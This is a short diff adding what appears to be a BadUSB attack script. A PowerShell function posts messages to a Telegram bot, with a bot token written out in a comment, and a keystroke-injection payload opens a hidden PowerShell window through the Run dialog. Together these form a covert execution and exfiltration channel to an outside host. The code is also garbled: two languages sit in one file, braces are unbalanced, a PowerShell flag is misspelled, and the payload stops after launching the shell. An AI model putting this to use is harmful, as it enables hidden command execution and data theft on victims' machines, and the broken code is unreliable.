@@ -1,0 +1,31 @@
+# $botToken = "8665518944:AAGN4ncP375c0rNFEsXiaOBN9G-0scYJ2qg"
+# $chatID = "chat_id"
+
+# Function for sending messages through Telegram Bot
+function Send-TelegramMessage {
+    param (
+        [string]$message
+    )
+
+    if ($botToken -and $chatID) {
+        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
+        $body = @{
+            chat_id = $chatID
+            text = $message
+        }
+
+        try {
+            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
+        } catch {
+            Write-Host "Failed to send message to Telegram: $_"
+        }
+}
+
+REM Begin Payload
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell -WindowsStyle hidden
+ENTER
+DELAY 300
+
